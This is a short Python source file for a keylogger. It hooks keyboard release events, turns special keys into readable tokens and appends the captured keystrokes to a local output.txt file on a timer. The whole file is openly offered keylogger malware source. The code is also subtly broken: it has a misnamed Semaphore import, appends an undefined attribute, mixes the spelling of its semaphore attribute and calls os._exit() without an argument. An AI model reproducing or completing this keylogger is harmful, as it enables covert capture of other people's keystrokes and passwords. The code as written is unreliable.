import keyboard
import os
from threading import semaphore, Timer


'''
  TODO
  [x] create a global variable to store logs
  [ ] create a write out object
'''
class Keylogger():
  def __init__(self):
    self.log = ""
    self.out = open("output.txt","a")
    self.Semaphore = semaphore(0)

  def callback(self,event):
    name = event.name

    if len(name) > 1:
      if name == "space":
        name = " "
      elif name == "enter":
        name = "[ENTER]\n"
      elif name == "decimal":
        name = "."
      elif name == "esc":
        self.out.close()
        os._exit()
      else:
        name = name.replace(" ", "_")
        name = f"[{name.upper()}]"

    self.log += self.name

  def report(self):
    if self.log:
      self.out.write(self.log)
    Timer(interval=1.0,function=self.report).start()

  def start(self):
    keyboard.on_release(callback=self.callback)
    self.semaphore.acquire()

if __name__ == '__main__':
  keylogger = Keylogger()
  keylogger.start()
